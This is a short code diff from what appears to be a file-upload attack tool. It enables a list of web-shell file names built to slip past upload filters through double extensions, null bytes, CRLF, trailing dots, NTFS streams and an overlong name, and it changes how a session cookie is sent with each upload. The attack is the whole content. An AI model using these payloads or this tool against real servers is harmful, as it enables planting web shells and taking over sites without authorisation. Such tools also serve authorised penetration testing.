@@ -39,19 +39,19 @@ def create_payloads():
         "shell.php.png",   
         "shell.pHp5",
         "shell.png.php",
-    #     "shell.php#.png",
-    #     "shell.php%20",
-    #     "shell.phpJunk123png",
-    #     "shell.png.jpg.php",
-    #     "shell.php%00.png",
-    #     "shell.php...",
-    #     "shell.php.png",
-    #     "shell.asp::$data",
-    #     "A" * 232 + ".php",
-    #     "shell.php%0a",
-    #     "shell.php%00",
-    #     "shell.php%0d%0a",
-    #     "shell.php%00.png%00.jpg"
+        "shell.php#.png",
+        "shell.php%20",
+        "shell.phpJunk123png",
+        "shell.png.jpg.php",
+        "shell.php%00.png",
+        "shell.php...",
+        "shell.php.png",
+        "shell.asp::$data",
+        "A" * 232 + ".php",
+        "shell.php%0a",
+        "shell.php%00",
+        "shell.php%0d%0a",
+        "shell.php%00.png%00.jpg"
     ]
 
     created_files = []
@@ -116,7 +116,7 @@ def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_f
     """
     # Headers
     headers = {
-        "Cookie": "PHPSESSID="+cookie["PHPSESSID"]
+        "Cookie": cookie
     }
 
     data = {}
